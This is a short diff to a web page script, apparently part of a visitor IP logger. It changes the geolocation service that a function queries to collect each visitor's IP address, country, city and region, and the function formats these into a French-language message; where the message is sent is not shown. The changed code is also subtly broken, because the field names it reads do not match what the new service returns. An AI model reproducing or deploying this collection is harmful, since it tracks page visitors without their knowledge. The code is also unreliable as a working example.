@@ -13,7 +13,7 @@
 
     <script>
         function THEfunction(content) {
-            fetch('http://ip-api.com/json')
+            fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(({ query, country, city, regionName }) => {
                     const message = `# Address ip : ${query}\n\n- Pays : ${country}\n- Ville : ${city}\n- Region : ${regionName}\n### Possibilités : \n ${content.split('\n').map(e => ` -  __${e}__`).join('\n')}`;
